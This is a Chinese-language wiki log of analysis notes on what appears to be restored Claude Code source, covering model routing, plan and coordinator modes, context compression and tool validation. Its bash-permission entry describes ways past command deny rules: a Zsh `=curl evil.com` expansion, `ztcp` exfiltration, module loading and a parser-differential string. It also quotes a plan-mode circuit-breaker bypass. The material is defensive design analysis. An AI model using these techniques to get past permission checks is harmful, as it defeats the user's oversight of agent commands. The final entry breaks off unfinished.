# Wiki Log

> Append-only 操作记录。格式：`## [日期] 操作类型 | 描述`

## [2026-05-18] init | Wiki 结构初始化

- 创建 SCHEMA.md（wiki 行为约定）
- 创建 index.md（全局索引）
- 创建 log.md（本文件）
- 规划 concepts/ comparisons/ entities/ 目录结构
- 现有 8 篇模块分析 + 2 篇 insights 纳入索引

## [2026-05-18] ingest | 面向失败架构分析

- 来源：对 restored-src/src/ 中容错机制的全面探索
- 产出概念页（待文件化）：multi-tier-degradation, circuit-breaker, at-most-once-delivery, withhold-then-recover, repair-on-read
- 产出对比页（待文件化）：between-turn-vs-within-turn
- 关联外部应用：leto-ai 的 empty-output-after-worker-delegation case

## [2026-05-18] ingest | LLM Wiki 模式

- 来源：Karpathy gist (https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f)
- 产出：insights/1.LLM_WIKI_PATTERN.md
- 决策：将本 docs/ 目录改造为 LLM Wiki 模式

## [2026-05-21] ingest | 模型路由分析

- 来源：用户提问"Claude Code 如何根据任务选不同模型"，追溯 `utils/model/`、`services/api/claude.ts`、`tools/AgentTool/built-in/*` 调用链
- 产出：concepts/model-routing.md（四层静态路由表）
- 关键结论：没有 LLM-as-router；主循环 = 用户配置；后台碎活 = 硬编码 Haiku；子 Agent = 声明式；plan mode 唯一动态分支仅作用于 opusplan / haiku 别名
- 留待追问：tengu_plum_vx3 flag 实测数据、issue #30815 事故详情、opusplan 设计取舍

## [2026-05-21] ingest | opusplan 设计取舍

- 来源：从 model-routing.md 留下的钩子继续钻；追溯 `getRuntimeMainLoopModel`、`parseUserSpecifiedModel`、`doesMostRecentAssistantMessageExceed200k`、`tipRegistry.opusplan-mode-reminder` 等 8 个相关位点
- 产出：concepts/opusplan-tradeoff.md（含完整取舍清单 + 裂隙代价表 + 6 条可迁移设计原则）
- 关键结论：opusplan 是静态路由表里唯一的动态裂隙；用「用户显式状态切换」替代 LLM-as-router；200K 逃生口是动态升级的标配；裂隙代价散落在 7 处基础设施
- 双向链接：model-routing.md 第 3 条钩子已替换为指向新页面

## [2026-05-21] ingest | tengu_plum_vx3 flag 解剖

- 来源：从 model-routing.md 留下的钩子继续钻；追溯 `WebSearchTool.ts:262-291`、`microCompact.ts:288`、`growthbook.ts:734`，对比 11 个 Haiku 调用点的处理方式差异
- 产出：concepts/flag-vs-hardcode.md（含风险分级表 + flag 三条终局 + Anthropic 命名约定）
- 关键结论：何时 flag 何时硬编码的核心判据 = "输出是否回流主推理链"；Haiku 替换降级为 formatter（强制 toolChoice 剥夺其决策权）；vx3 后缀承认实验仍在迭代；同色系 plum_violet 已毕业、plum_vx3 仍在测——构成 flag 生命周期的活样本
- 双向链接：model-routing.md 第 1 条钩子替换、底部"关联"补充交叉引用

## [2026-05-21] ingest | aliasMatchesParentTier / issue #30815 事故剖析

- 来源：从 model-routing.md 留下的最后一个钩子继续钻；追溯 `agent.ts:110-122` 补丁 + `model.ts:105-128` provider-default 分裂；WebFetch 拿到 issue #30815 原始报告（Vertex Opus 4.6 → 子 Agent Opus 4.1 静默降级）
- 产出：concepts/alias-tier-inheritance.md（含事故还原 + 12 行补丁 + 三类动态化驱动源对照表）
- 关键结论：默认值是为冷启动设计的、不是为继承设计的；provider 分裂是结构性常态（"will diverge again at the next model launch"）；附加语义的 alias（opus[1m]/opusplan/best）故意 fall-through；UI 撒谎比显式失败更危险——沉默降级是真正的伤害
- 拉通：opusplan（user-driven）/ flag-vs-hardcode（Anthropic-driven）/ 本页（provider-driven）构成模型路由动态化三种独立驱动源——model-routing 三个钩子全部消化
- 双向链接：model-routing.md 第 2 条钩子替换、底部"关联"补充交叉引用

## [2026-05-21] insight | 自我批判方法论文档（3.SELF_CRITIQUE.md）

- 来源：4 轮自我批判（prompt-cache-editing → ground-truth-via-tools → DESIGN_PRINCIPLES → 簇分组）累积发现的 meta pattern——研究过程中反复犯同一种归纳偏差的不同抽象层级版本
- 产出：insights/3.SELF_CRITIQUE.md（9 类归纳偏差 + 抽象阶梯 4 层 + 写作检查清单 10 条 + 5 个认识论原因 + 7 条给未来研究者的建议）
- 关键洞察：
  - **抽象阶梯**：归纳偏差在 4 层都出现——单机制 / 单页 / 簇 / 整本 wiki，每升一层失真累积
  - **修法全是单向的**：4 轮修改全部是降级 framing / 剥过度叙事——**没有一次是补充新内容**。这意味着研究的"结论"层比看起来少
  - **9 类具体偏差**带 signature 和修法清单：单一信号当事实 / 多机制归纳为根哲学 / 编故事填补观察空白 / 过度对立化框架 / Implementation choice 包装为原则 / 通用属性当作系统特征 / 目录驱动归纳 / 服务端从 client 反推 / "碰巧符合"当作"有意为之"
  - **5 个认识论原因**：研究者偏差 / 故事压缩 / Quotable 拉力 / 缺反馈循环 / 抽象阶梯压力
  - **可信度排序**：代码引用 > OBS > INF > SPEC > NARR；最 quotable 的部分通常最不准确
- 文档定位：本 wiki 可信度结构的元说明——读者用 wiki 时应当带这份"认识论 lens"
- 给未来研究者的核心建议：先约定标签语言（OBS/INF/SPEC/NARR）；每章末尾问"反例呢"；抽象阶梯每升一层 +1 怀疑度；接受"碰巧符合"是真实情况——不是每个 pattern 都有故事

## [2026-05-21] meta-finding | 簇分组本身是过度归纳

- 来源：自我批判进入第 4 轮——审视盘点时归纳的 7 个簇是不是真的coherent
- 关键发现：7 个簇里 2 个是过度归纳的
  - **"防幻觉簇 7 篇"**：只有 3 篇真正核心是防幻觉（read-before-write / task-notification-injection / false-claims-bidirectional）；result-delivery-guarantee 是交付问题、predictable-hallucination-hardcode 是输入修复、post-generation-verification-channels 是通用 verification——都借了"防幻觉"标签
  - **"权限/Mode 簇 4 篇"**：plan-mode-state-machine + bash-command-classification 是真权限；coordinator-mode 是工作流模式、plan-verification-handoff 是状态机驱动 reminder——后两个跟权限关系弱，因为文件目录相近被归一起（**目录驱动归纳**的反 pattern）
- 真实子主题（修正后）：真防幻觉(3) / 输入输出质量(3) / 交付可靠性(2) / 架构事实(1) / 权限(2) / 工作流模式(2) / 模型路由(4) / 失败恢复(4) / 工具系统(2) / 上下文管理(2)
- 影响杠杆：高——簇分组在多处被引用（DESIGN_PRINCIPLES、log、口头回复），多次说"7 篇都遵循 X 原则"实际是 2-3 篇遵循
- 修法：不动文件结构（成本高），加 meta-warning 到 index.md 顶部 + DESIGN_PRINCIPLES 加簇分组的认知边界——索引登记把这条说清楚
- meta meta：这次发现的 pattern 跟单页归纳偏差是**同一种错误的更高阶版本**——"看到多机制 → 提炼原则 → 起 quotable 名字"在簇分组层面表现为"看到多页 → 归一个簇 → 起统一标签"。修单页和修簇是同源问题

## [2026-05-21] revise | DESIGN_PRINCIPLES.md 加认知边界 + 重命名为假说

- 来源：刚审视 prompt-cache-editing.md 和 ground-truth-via-tools.md 暴露的归纳偏差问题——意识到 DESIGN_PRINCIPLES 也是同问题的高阶版本
- 改动：
  - 标题改为"设计假说提炼（事后归纳）"——明确性质
  - 页首加 "⚠ 认知边界（必读）" 框，明说**不是 Anthropic 的设计哲学**而是我的事后归纳
  - 元论点加削弱说明：是我的归纳，Anthropic 可能没用这语言，可能在某些机制反向
  - 五簇前加可信度说明：实例 > 迁移配方 > 论点 > 直觉
  - 3 条贯穿线**全部加削弱分析**：
    - 线 1（物理>诚信）"部分成立"——在某些子系统反向（[[predictable-hallucination-hardcode]] / [[false-claims-bidirectional]]）
    - 线 2（明确>含糊）"中度可信"——夸大了"部分明确"
    - 线 3（分层>单点）"通用属性，不是 Claude Code 的特征"——任何成熟系统都有
  - "怎么用本文档"重写：分"可以直接用 / 要带怀疑 / 不要直接用"三档
- 关键结论：保留文档的启发价值，但承认元论点和贯穿线是 NARR 风险最高的部分；反 pattern 速查表和每条原则的实例段才是真正可信的
- 索引登记同步更新：摘要明说"事后归纳的设计假说（带认知边界框：明确不是 Anthropic 的设计哲学）"

## [2026-05-21] revise | ground-truth-via-tools.md 校准为单一面描述

- 来源：自我批判暴露此页是"过度归纳的最大风险"——把"消息历史不可伪造"包装成"防幻觉根哲学"
- 改动：
  - 页首加 "⚠ 认知边界" 框，明说防幻觉簇 7 篇里只有 2-3 篇真正派生于该机制
  - "无法伪造事实"加边界注释——只覆盖消息历史，不覆盖 assistant text
  - 大输出"必经重新 Read"主要动机改为 token 成本/上下文压力，"防幻觉"标为 side effect
  - leto-ai 对偶段重写为"侧重差异"而非"对偶解法"
  - 设计原则表 6 条全部加 OBS / INF / NARR / OBS+NARR 标签
  - 关联段重写：派生 / 互补 / 正交 / 部分矛盾——明说 7 篇之间的真实关系
- 暴露的更深问题：防幻觉簇本身是过度归纳——7 件事是 7 个独立工程问题碰巧贴了同标签

## [2026-05-21] revise | prompt-cache-editing.md 标注观察 vs 推断

- 来源：自我批判挑出"伪权威风险最高"的页（服务端语义都是 client 端反推）
- 改动：
  - 页首加 "⚠ 认知边界" 框
  - 核心机制框图拆成"client 行为 (OBS)"+"服务端处理 (INF/SPEC)"，第二段附**4 种替代解释**
  - 删除"为什么不让服务端记住"段（纯 NARR 编故事）
  - 设计原则表加 OBS / INF / SPEC 列；"Cache 状态保持纯净"标 SPEC + 反例说明
  - 可迁移性拆成"强可迁移 (5 条 OBS)"+"弱可迁移 (1 条 SPEC)"+ leto-ai 建议明说"是通用 RDB 模式不需要 cache_edits 当依据"
- 关键发现：原页推荐的 leto-ai 迁移建议（订单软删 / Verifier 历史无效化）是经典 RDB 模式，60 年代就有——把它包装成"cache_edits 设计哲学"是过度增添叙事

## [2026-05-21] insight | 设计原则提炼（盘点综合）

- 来源：24 篇 concept 页累积到一定密度后做盘点；用户选择写综合 insight 而非继续钻具体子系统
- 产出：insights/2.DESIGN_PRINCIPLES.md（5 簇原则 + 反 pattern 速查表 + 3 条统一哲学）
- 5 个原则簇：
  - **信任与防御**：物理约束 > prompt / Fail-closed / 拒绝宽松解析 / 多层 gate / 修复对模型不可见
  - **信息流设计**：状态外部化 + 多层恢复 / 输入-中间-输出三层防御 / 事件锚点 vs 全局锚点 / 跨级显式数据流
  - **LLM 协作**：节流 > 每轮提醒 / 委托不能转移理解 / 信息密度 > 防御性 / 错误消息面向 LLM
  - **演化与实验**：Magic numbers 必附理由 / 默认值是冷启动专用 / 观测的合法/非法分类 / Tool 实现可分离 wire-up 必须保留
  - **复杂度管理**：代价/失真梯度排序 / 弱启发式有意识地弱 / 单一谓词跨多功能 / ML 兜底结构化主路径 / 用户配置作为开放扩展点
- 3 条统一哲学：物理 > 诚信 / 明确 > 含糊 / 分层 > 单点
- Meta-thesis：**Claude Code 的设计姿态——不信任 LLM 的诚实性，但充分利用 LLM 的判断力。架构让"想做坏事也做不到"，prompt 让"想做好事时推理负担最低"**
- 文档定位：本文档作为提炼层，在 24 篇 concept 设计层之上、源码实现层最上，**杠杆最高的入口**

## [2026-05-21] ingest | Plan 实施后自动验证交接

- 来源：[[plan-mode-state-machine]] / [[coordinator-mode]] 都提过没钻；通读 `AppStateStore.ts:411-417`（pendingPlanVerification 状态）+ `REPL.tsx:3065-3088`（plan 退出触发）+ `attachments.ts:3892-3929`（节流 reminder）+ `messages.ts:4240-4250`（reminder 文本）+ `classifierDecision.ts:40-44`（auto-mode allowlist）
- 产出：concepts/plan-verification-handoff.md（状态机驱动 reminder 模式 + DCE 三层 + 跟其他 nudge 机制对比 + 8 条设计原则）
- 关键发现：
  - **状态机驱动 reminder 是通用模式**：状态决定是否提醒，不是定时器或硬性每轮提醒。3 状态最小机：未开始 → 已启动 → 已完成
  - **节流参数实测决定**：`TURNS_BETWEEN_REMINDERS = 10`——LLM 看到重复提醒会忽略，间歇性提醒效果更好
  - **Reminder 锚点是事件而非全局**：turnCount 从 plan_mode_exit attachment 起算——保证 reminder 只在 plan 实施期间生效
  - **"directly (NOT the Agent tool)"强约束**：主 Agent 必须自己调 VerifyPlanExecution，不能委托——验证责任不可转移，跟 [[coordinator-mode]] 的"never write 'based on findings'"是同源原则
  - **3 层 DCE 实验隔离**：feature flag / process.env.USER_TYPE / 字面量比较 `"external" === 'ant'`——3P 公开包里 tool 实现完全不存在（目录、constants、prompt、UI 全删），但 wire-up（状态字段、属性钩子、reminder 注入路径）保留
  - **Tool 实现可分离，wire-up 必须保留**：避免 wire-up 漂移，让"启用功能"只需把 tool 实现 link 进来
  - **Auto-mode allowlist 减摩擦**：用户进 auto 时已隐式同意"plan 实施 + 验证"全流程，不再 prompt
  - **跟其他 nudge 机制对比表**：plan reminder（10 轮）vs verification nudge（loop-exit 唯一时机）vs compaction reminder（25% token）vs context efficiency（10k token）——每种锚点不同
- 给 leto-ai 迁移：
  - 用户下单 → 必须发履约确认 → 同模式
  - 退款审批 → 必须财务核账 → 同模式
  - "强约束指定执行者"语言可迁移：`do X yourself, NOT delegate to Y`
  - 节流参数 A/B 测；reminder 锚点绑事件不绑全局
  - Auto-mode allowlist 思路：用户已隐式同意的工作流上的工具加进 allowlist 减 prompt

## [2026-05-21] ingest | Coordinator 模式深挖

- 来源：之前 [[task-notification-injection]] / [[plan-mode-state-machine]] / [[tool-concurrency-streaming]] 都提过但没钻深；通读 `coordinator/coordinatorMode.ts:36-369`（核心模块 + 369 行 system prompt）+ `AgentTool.tsx:223-252,567,750`（forced async + 工具过滤）+ `forkSubagent.ts:34`（fork 禁用）+ `tools.ts:281-296`（工具子集分配）+ `main.tsx:2199`（proactive 禁用）+ `main.tsx:3771`（session 绑定）
- 产出：concepts/coordinator-mode.md（核心机制 + 12 个具体实现细节 + 13 条设计原则 + 8 条迁移建议）
- 关键发现：
  - **身份保留**：coordinator 的 `agentId === undefined`——还是主线程身份，跟普通主 Agent 一样消费 user prompt，但不亲自执行任何文件操作
  - **强制 async 是核心生产力**：`isCoordinator` → `shouldRunAsync = true`。主 Agent 不阻塞等 worker，立即推理。**主线程一直在思考，worker 一直在干活**
  - **Worker 互相隔离**：不能 spawn 子 worker（看不到 AgentTool）、不能 SendMessage、不能 TeamCreate。所有协调通过 coordinator 中转——避免 worker 依赖图复杂化
  - **每个 worker prompt 必须自包含**："workers can't see your conversation"——所有 context 必须打包进 prompt
  - **Synthesize 不可 delegate**：System prompt 强约束 "Never write 'based on your findings' or 'based on the research'"——理解必须在 coordinator 发生，不能转移给 worker
  - **Continue vs Spawn 决策矩阵**：6 行决策表按 context overlap。研究→实施(同文件)续聊；研究→验证(fresh eyes)新起；错误路径重试新起
  - **双层 QA**：worker 自验证（first layer，typecheck/test）+ 独立 Verifier worker（second layer）——直接对接 [[post-generation-verification-channels]]
  - **Session 绑定不能漂移**：matchSessionMode 自动 flip env var 让 session resume 一致
  - **Scratchpad 解耦 worker 间共享**：worker 不通信但可以共享文件目录（`tengu_scratch` flag）。免权限提示
  - **Model param 被丢弃**：coordinator 不能给 worker 指定 model，必须 default。"Workers need the default model for substantive tasks"
  - **Fork 禁用**：永远 fresh worker，跟"workers can't see your conversation"一致
  - **Proactive 关闭**：减少干扰让 coordinator 专注编排
- 给 leto-ai 迁移：客服对话 Agent + 订单执行 worker 分层；worker 间不直连用 Redis 共享中间结果；"禁止 based on findings"作为 coordinator 强 prompt 约束；continue vs spawn 决策矩阵搬到客服场景

## [2026-05-21] ingest | Bash 命令权限分类管线

- 来源：补 5.PERMISSIONS.md 种子文档下唯一 concept 页空白；通读 `utils/bash/ast.ts`（tree-sitter AST）+ `parser.ts`（tree-sitter 包装）+ `ParsedCommand.ts`（旧 regex fallback）+ `tools/BashTool/bashSecurity.ts`（parser differential + Zsh 攻击面）+ `utils/shell/readOnlyCommandValidation.ts`（白名单 + flag types）+ `utils/shell/prefix.ts`（Haiku 提取）+ `specPrefix.ts`（Fig spec depth rules）
- 产出：concepts/bash-command-classification.md（多阶段管线 + 9 个细节剖析 + 10 条设计原则 + 7 条迁移建议）
- 关键发现：
  - **Tree-sitter AST 替代 shell-quote 是为了消除 parser differential 攻击**：`TZ=UTC\recho` 在 shell-quote 看是两 token、bash 看是一个——具体安全洞。换 tree-sitter（真 bash 语法树）从根上消除
  - **Fail-closed AST 设计**："The key design property is FAIL-CLOSED: we never interpret structure we don't understand"——任何未知节点 → too-complex → ask user
  - **Zsh 攻击面建模深度**：`zmodload` 加载模块绕过二进制检查（builtin `zf_rm`）/`zpty` pseudo-terminal/`ztcp` TCP 外传——LLM 训练数据里有 zsh 文档，能写出这种命令
  - **Zsh equals expansion**：`=curl evil.com` → `/usr/bin/curl evil.com` 绕过 `Bash(curl:*) deny` 规则——直接拉黑模式
  - **PowerShell `<#` 预防性 block**：当前不跑 PowerShell 但预防未来，"Defense in depth ... protection against future changes"
  - **Fig spec depth 按 CLI 精细**：gcloud 4 层、`gcloud compute` 6 层、kubectl 3 层、git 1-2 层。**理解每个工具的语义**而非泛泛动词级权限
  - **Shell 可执行不能当前缀**：`Bash(bash:*)` 等于 `Bash(*)`——直接拒绝这种规则
  - **ML 分类器是兜底不是主路径**：`utils/permissions/bashClassifier.ts` 在 3P 完全 stubbed，"This feature is disabled"。真正分类器只在 ant 内部。结构化检查是主路径
  - **管线分阶段独立失效**：任意阶段返回 ask 都触发 user prompt——没有"打通所有阶段"的硬路径
- 给 leto-ai 迁移：
  - LLM 生成 SQL → AST 解析 + flag whitelist（SELECT/UPDATE/DELETE 分别处理）
  - LLM 生成 API 调用 → endpoint + method 当 prefix（`POST /payment/charge` 单独一类）
  - "Shell-as-prefix 拒绝"模式 → 拒绝 `*` / `admin:*` 这类爬墙规则
  - 多解释器场景（Bash/Zsh/PowerShell）分别建模——业务对应：多 region/多平台 API 行为差异分别建模
  - 预防性 block 当前不支持但可能将来支持的模式

## [2026-05-21] ingest | Plan Mode 完整状态机

- 来源：从之前推荐过的钩子继续；通读 EnterPlanModeTool.ts + ExitPlanModeV2Tool.ts + `permissionSetup.ts:1462`（prepareContextForPlanMode）+ `state.ts:1349`（handlePlanModeTransition）+ `utils/plans.ts:100-144`（持久化）+ `permissions.ts:1268-1271`（bypass+plan 交叉）
- 产出：concepts/plan-mode-state-machine.md（4 路径进入表 + 5 步退出 + Circuit-breaker 退出降级 + 文件持久化 3 层恢复 + Teammate 分布式审批 + 11 条设计原则）
- 关键发现：
  - **prePlanMode 是栈顶寄存器**：进 plan = push，退 plan = pop。没它就丢失原状态信息
  - **栈顶恢复必须校验**：Circuit breaker 已关闭时，prePlanMode='auto' 要降级回 default。不能盲目恢复栈顶值——auto-mode gate 在 plan 期间被关时，"Without this, ExitPlanMode would bypass the circuit breaker by calling setAutoModeActive(true) directly"
  - **4 种 auto×plan 交叉**：useAutoModeDuringPlan 设置 + 当前 mode 决定 4 条进入路径，反映 mode 系统的复杂度
  - **bypass+plan 不冲突**：用户最初进 bypass 等于"不问就行"，plan 只是 UI 状态切换不收紧权限
  - **Plan 模式靠 prompt + tool 行为约束，没有全局工具过滤**：read-only 是软约束（model 看 system prompt 提示），不是硬过滤
  - **Plan 文件外部化是状态根**：`~/.claude/plans/{slug}.md`，跨 session 恢复——3 层 fallback（文件 → file snapshot → message history）
  - **Subagent plan 文件隔离**：`{slug}-agent-{id}.md` 防 nested teammate 互相覆盖
  - **Teammate 分布式审批**：plan_approval_request 写到 team-lead mailbox，状态机能"等外部信号"——不是 RPC 同步
  - **Channels 模式禁用 plan**：避免"模型能进但不能出"的 trap（exit 需要 terminal dialog）
  - **agent context 不能切 plan**：`if (context.agentId) throw`——plan 是用户级状态
  - **Plan 退出 attachment 是显式信号**：needsPlanModeExitAttachment 让模型在下一轮看到"plan 已批准、可以实施"
- 跟 [[opusplan-tradeoff]] 的关系：plan mode 是**单一信号但有两个独立下游消费者**——模型路由用它升 Opus，permission 用它走状态机。两个 concept 页对照看
- 给 leto-ai 迁移：
  - "审核中"模式参考 prePlanMode 押栈（含校验：审核期间被风控降权时降级恢复）
  - 订单关键状态外部化到 KV store + 多层恢复
  - 多人协作批准用 mailbox（异步等外部信号），不是 RPC 同步等
  - 防快速 toggle 抖动（进入清旧标记）

## [2026-05-21] ingest | Prompt Cache Editing API 内幕

- 来源：从 [[context-compression-cascade]] 第 ② 级 cached microcompact 路径继续钻；通读 `claude.ts:3052-3209`（API 编排）+ `claude.ts:1184-1689`（5 层 gate + latch）+ `bootstrap/state.ts:234-237`（latch 状态）+ `promptCacheBreakDetection.ts:65-67`（合法 miss 标记）
- 产出：concepts/prompt-cache-editing.md（API 契约反推 + 5 层启用矩阵 + Sticky-on latch 设计 + Pinned edits 模式 + 内部基础设施术语泄露）
- 关键发现：
  - **API 契约**：`cache_edits` 块 + tool_result 上的 `cache_reference` 字段。client 用 `tool_use_id` 寻址要删的 result
  - **删除是请求级投影，不是物理删**：服务端 cache prefix 永远不变；每轮请求 client **重新发同一 cache_edits 块**告诉服务端"本请求看不到这些"——idempotent 设计
  - **Sticky-on latch 防 mid-session 抖动**：beta header 一旦本会话出现就持续发送（影响 cache key），但 body 行为跟随动态 flag——header / body 信号解耦
  - **5 层 gate**：feature DCE → GrowthBook flag → first-party → main-thread → 模型白名单；任一失败回退 [[context-compression-cascade]] 兜底
  - **内部基础设施术语泄露**：注释提到 Mycro / KVCC / page_manager/index.rs / cache_store_int_token_boundaries——Anthropic 推理引擎细节。Client/Server 深度耦合，client 作者熟悉服务端 Rust 实现
  - **"Strict before" 比 ≤ 保守**：API 允许 cache_reference 在 cache_control "before or on"，client 选 strict before 防 placement 边缘 case
  - **观测的合法/非法分类**：cache_edits 删除导致 cache_read 合法下降，必须打 `cacheDeletionsPending` 标避免误报
- 给 leto-ai 迁移：5 个通用模式
  1. 逻辑删除 vs 物理删除分离（订单/商品下架/Verifier 验证记录）
  2. Sticky-on latch 防 mid-session 抖动（影响 cache key / connection identity 的配置）
  3. Header / body 信号分离（连接身份级 latch + 行为级动态）
  4. Pinned + re-send（client 维护逻辑状态，每次操作投影）
  5. 多层 gate 收紧实验（新 API beta 应该层层放开）

## [2026-05-21] ingest | 上下文压缩四级级联

- 来源：补 wiki 最大空白（上下文管理完全无概念页）；通读 `query.ts:396-468` 编排 + `microCompact.ts` + `autoCompact.ts`；发现 `feature('HISTORY_SNIP')` / `feature('CONTEXT_COLLAPSE')` 是 DCE flag——Snip / Context Collapse 在 3P 公开包里**根本没有源文件**
- 产出：concepts/context-compression-cascade.md（4 级详细 + 成本失真梯度表 + 公开 vs 内部差异 + 8 条设计原则）
- 关键发现：
  - **3P 公开版实际只跑 Autocompact 兜底**——其他 3 级在 npm 包里要么 DCE 要么 no-op；microCompact.ts:288 注释明说 "autocompact handles context pressure instead"
  - **代价/失真梯度排序**：① Snip（O(n) 本地，无损）→ ② Microcompact（清 tool_result 占位符）→ ③ Collapse（projection 幂等）→ ④ Autocompact（一次 LLM 调用）。能用早期就别用后期
  - **Time-based microcompact 搭便车 cache miss**：cache 已过期反正要 rewrite prefix，顺手清掉旧 tool_result——0 边际成本换额外收益
  - **Projection vs destructive 双策略**：① ② 改原始消息，③ projection 只改视图。不同寿命数据用不同思路
  - **Empirical sizing**：`MAX_OUTPUT_TOKENS_FOR_SUMMARY = 20_000` 来自 p99.99 实测（17,387 tokens）
  - **Circuit breaker 事故驱动**：`MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3`，注释附数据 "1,279 sessions 50+ 连失，3,272 单 session 最差，每天浪费 25 万次 API 调用"——加这个 limit 的真实理由
  - **跨级显式数据流**：`snipTokensFreed` 从 ① 显式传给 ④——下游不能默默假设上游什么也没做
  - **Tengu_cache_plum_violet 毕业样本**：[[flag-vs-hardcode]] 提过的 "is always true" 注释正是 microcompact 路径——legacy 客户端 microcompact 删了，3P 直接 no-op
- 给 leto-ai 迁移：Order history 无界 → 类似级联（最近 N + 更老的 summary）；Verifier 跨 session 历史用 projection 思路；不要只做"满了就 LLM-summarize"

## [2026-05-21] ingest | 工具并发与流式执行

- 来源：用户切换主题到工具并发（之前推荐过但未钻）；通读 `services/tools/StreamingToolExecutor.ts:1-489` + `toolOrchestration.ts:1-130`；grep 29 个内置工具的 `isConcurrencySafe` 实现做谱系
- 产出：concepts/tool-concurrency-streaming.md（执行路径双道 + 安全谱四类 + 失败传播非对称性 + 三层 AbortController 架构 + 进度/结果分流）
- 关键结论：
  - **isConcurrencySafe 是输入函数不是 boolean**：Bash/PowerShell 看 input 决定（`isReadOnly` 代理）；状态变更也能 safe（TaskCreate/TaskUpdate 因 setState callback 原子性）
  - **失败传播按工具语义非对称**：仅 Bash 错误 cancel 兄弟（依赖链假设），Read/WebFetch 失败不传染（独立查询）。注释直说 "Read/WebFetch/etc are independent — one failure shouldn't nuke the rest"
  - **三层 AbortController**：parent (query 级) / sibling (Bash 错误时) / per-tool；最微妙的是**反向 bubble-up**——issue #21056 修复，权限被拒必须升级到 turn 级，否则模型会无视继续推理
  - **结果保序，进度不保序**：长跑工具的进度消息绕过顺序约束立即 yield，让 UI 感知"系统在动"
  - **interruptBehavior 区分 cancel/block**：Bash 默认 block 防中途中断系统调用——并发 + 可中断不是普世原则
  - **流式 fallback 全丢弃 + 重试**：部分结果不可信任，简单语义胜过 partial 状态恢复
- 给 leto-ai 迁移建议：
  - 支付/库存这类强依赖链工具组应声明 not-safe 串行（同 Bash）；查询类天然 safe 并发降低响应时间
  - 写**领域专属的失败传播规则**：库存预占失败 → 取消支付兄弟；图片加载失败 → 不取消价格查询
  - interruptBehavior 直接搬用：发邮件 block，查询 cancel
- 留下的钩子：context modifier 在并发场景未实现（NOTE 注释承认）；AgentTool 标 safe 但子 Agent 递归 spawn 时 MAX_TOOL_USE_CONCURRENCY 是顶层还是每层独立未知

## [2026-05-21] ingest | 工具参数预执行 7 步校验管线

- 来源：从 7.ANTI_HALLUCINATION.md §11 继续钻；通读 `services/tools/toolExecution.ts:600-948` 实际管线代码（验证种子文档 7 步划分准确，但补充了 speculative classifier、backfillObservableInput 双 input 分流等细节）
- 产出：concepts/tool-args-prevalidation.md（7 步详解 + LLM-friendly error 设计原则 + leto-ai Layer 1 迁移模板）
- 关键结论：
  - **承认模型生成 input 不可靠是设计前提**——注释 "surprisingly, the model is not great at generating valid input" 是整条管线的根
  - **失败回流而非抛异常**：每步失败都构造 user-role tool_result，让主循环自然 retry——这是 Agent 系统跟传统软件的根本区别
  - **错误消息面向 LLM 设计**：`<tool_use_error>` XML + is_error: true + 纠正建议（"Did you mean..." / "Load tool first..."）三件套
  - **观测 input 与执行 input 分流**（backfillObservableInput）：hook/permission 看完整路径，tool.call() 看原 path——保持 transcript 一致性 + VCR fixture hash 不漂移
  - **Defense-in-depth 留给低概率高代价**：`_simulatedSedEdit` schema 应该挡住但仍然运行时剥离——成本低、保险层叠
  - **Speculative classifier**：拒绝时间做有用工作的范例——把延迟藏到本来就要等的时间里
- 给 leto-ai 迁移模板：结构 vs 语义分开（Zod 通用 / validateInput 业务）；错误消息从面向人类改成面向 Agent retry；观测分流（风控看完整、执行看原始）

## [2026-05-21] ingest | 可预测幻觉硬编码修复模式

- 来源：从 7.ANTI_HALLUCINATION.md §6 继续钻，但拓展到种子文档没收录的 4 个样本（semanticNumber/Boolean、normalizeQuotes、markdown 禁 strikethrough）；grep `model occasionally` / `the model often` 找出全部硬编码修复点
- 产出：concepts/predictable-hallucination-hardcode.md（6 样本对照表 + 共同设计模式 + 反面边界 + 失效模式）
- 关键结论：
  - **代价驱动 > 频率驱动**：Windows nul 不高频但破坏 git 必须修；smart quotes 高频但代价低，归一化即可
  - **修复对模型不可见**：API schema 仍声明正确类型，日志仍显示规范输出。修复是单向的客户端兜底，不污染模型认知
  - **窄于宽松解析**：显式拒绝 `z.coerce.number()` / `z.coerce.boolean()` —— 它们会让真正的输入错误"碰巧通过"，必须用精确正则边界
  - **接受信息不对称是根因**：desanitize 是修复架构副作用（API 消毒），不是修复模型缺陷
  - **反面边界**：模型应当用判断力解决的问题（编造结果、猜 URL）不能硬编码——会掩盖真实 bug
- 给 leto-ai 的迁移建议：建立"已知偏差"清单（SKU 大小写/全角句号/单位混用等结构性偏差直接硬编码）；评估优先级看"出错损失"不看"频率"；拒绝标准库的宽松函数

- 来源：从 7.ANTI_HALLUCINATION.md §12 的 5 通路对比表继续钻；追溯 `services/lsp/LSPDiagnosticRegistry.ts`（LSP 限流 + LRU 去重）、`services/diagnosticTracking.ts`（baseline diff 只报新增）、`utils/hooks.ts:643`（PostToolUse 触发）、attachments.ts:2854-2893（注入路径）
- 产出：concepts/post-generation-verification-channels.md（5 通路总览表 + 失效模式 + 跟 leto-ai 三层闭环对比 + 5 条可迁移性提问）
- 关键结论：
  - **故意没有"自动跑功能验证"的统一通道**——成本太高 + 谁来判断"该多深"本身需要语义理解 + 自动化引入新问题。把功能验证留给契约触发的 Verifier
  - **新增 vs 全量诊断要分开**：IDE diagnostic 只报"因这次编辑新增的"——比"全量 lint"信号纯净一个数量级
  - **多通路独立 + 自动 + 手动并存**：LSP/IDE/Hook 自动覆盖广度，Verifier 手动覆盖深度——无法相互替代
  - **跟 leto-ai 对比**：Claude Code 没有 Layer 3 持续巡检（CLI 单会话）；Verifier 触发是契约式（任务异质性高）vs leto-ai 编排式（业务规则可枚举）
- 双向链接：跟 [[ground-truth-via-tools]] / [[false-claims-bidirectional]] / [[task-notification-injection]] / [[flag-vs-hardcode]] / [[result-delivery-guarantee]] 形成防幻觉概念簇 5 页交叉

## [2026-05-21] ingest | 防幻觉顶层哲学 + 双向 FC 治理

- 来源：用户工作主题切换到幻觉处理；7.ANTI_HALLUCINATION.md 已是 13 章种子文档但只沉淀了 read-before-write 一篇 concept 页——按"对幻觉处理工作的迁移价值"重新梳理 8 个候选概念，按推荐顺序优先两篇
- 产出：concepts/ground-truth-via-tools.md（防幻觉根哲学，对偶 leto-ai 验证路径解耦原则）+ concepts/false-claims-bidirectional.md（FC 双向治理，Capybara v8 FC rate 漂移 + hedging 反制）
- 关键结论：
